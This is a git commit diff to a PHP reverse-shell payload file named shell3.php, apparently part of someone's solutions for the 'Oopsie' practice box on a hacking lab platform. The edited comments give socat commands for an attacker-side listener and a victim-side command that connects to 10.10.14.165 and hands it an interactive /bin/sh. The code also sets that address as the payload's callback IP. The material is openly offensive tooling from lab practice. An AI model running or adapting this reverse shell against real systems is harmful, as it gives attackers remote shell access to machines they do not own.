5795df4a424cae4fdf126bbbd0a24995aa44c66d
Henry Post <HenryFBP@gmail.com>
2021-03-27 14:08:16 -0500

    `socat` doesnt work q_q

--- boxes/oopsie/payload/shell3.php
+++ boxes/oopsie/payload/shell3.php
@@ -1,8 +1,8 @@
 <?php
 
-// run this on attacker machine:    socat file:`tty`,raw,echo=0 tcp-listen:1234
-// pretend to be victim:            socat tcp-connect:localhost:1234 exec:/bin/sh,pty,stderr,setsid,sigint,sane
-
+// run this on attacker machine:            socat file:`tty`,raw,echo=0 tcp-listen:12345
+// pretend to be victim:                    socat tcp-connect:localhost:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+// run this on victim for better shell:     /tmp/socat tcp-connect:10.10.14.165:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
 
 function echobr($s)
 {
@@ -12,7 +12,7 @@ function echobr($s)
 echobr("<pre><code>"); //too lazy to view source :3
 
 $cmd = 'socat';
-$ip = '10.10.15.21';
+$ip = '10.10.14.165';
 $port = '1234';
 
 $out = null;
